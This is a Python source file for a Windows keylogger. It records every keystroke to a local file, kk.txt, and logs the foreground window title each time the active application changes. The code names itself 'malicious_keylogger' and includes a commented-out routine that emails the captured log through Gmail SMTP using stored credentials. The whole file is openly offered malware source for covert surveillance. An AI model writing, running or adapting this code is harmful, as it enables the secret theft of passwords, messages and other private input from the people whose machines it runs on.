#!/usr/bin/env python

# import smtplib

import threading
import win32gui
from pynput import keyboard
import psutil
import win32process

# Create Keylogger Class

class KeyLogger:

    # Define __init__ variables

    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password

    # Create Log which all keystrokes will be appended to

    def append_to_log(self, string):
        self.log = self.log + string

    # Create Keylogger

    def on_press(self, key):
        current_key = ''
        try:
            current_key = str(key.char)
            with open("kk.txt","a+") as f:
                f.write(current_key)
        except AttributeError:
            if key == key.space:
                current_key = " "
                with open("kk.txt","a+") as f:
                    f.write(current_key)
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)
        return False


    # Create underlying back structure which will publish emails

    # def send_mail(self, email, password, message):
    #     server = smtplib.SMTP('smtp.gmail.com', 587)
    #     server.starttls()
    #     server.login(email, password)
    #     server.sendmail(email, email, message)
    #     server.quit()

    # Create Report & Send Email

    # def report_n_send(self):
    #     send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
    #     self.log = ""
    #     timer = threading.Timer(self.interval, self.report_n_send)
    #     timer.start()

    # Start KeyLogger and Send Off Emails

    def start(self):
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            keyboard_listener.join()
            keyboard_listener.stop()
        return False
kkk = ''
while True:
    try:
        w=win32gui
        # print(w.GetWindowText(w.GetForegroundWindow()))
        pid = win32process.GetWindowThreadProcessId(w.GetForegroundWindow())
        if psutil.Process(pid[-1]).name()!=kkk:
            with open("kk.txt","a+") as f:
                f.write('\n'+'>>>>>'+w.GetWindowText(w.GetForegroundWindow())+'\n')
            # print('\n'+'>>>>>'+w.GetWindowText(w.GetForegroundWindow())+'\n')
            # print('>>>>>'+psutil.Process(pid[-1]).name()+'\n')
            kkk = psutil.Process(pid[-1]).name()
            # malicious_keylogger = KeyLogger(10, 'c', 'h')
            # malicious_keylogger.start()
        else:
            # None
            malicious_keylogger = KeyLogger(10, 'c', 'h')
            malicious_keylogger.start()
    except:
        None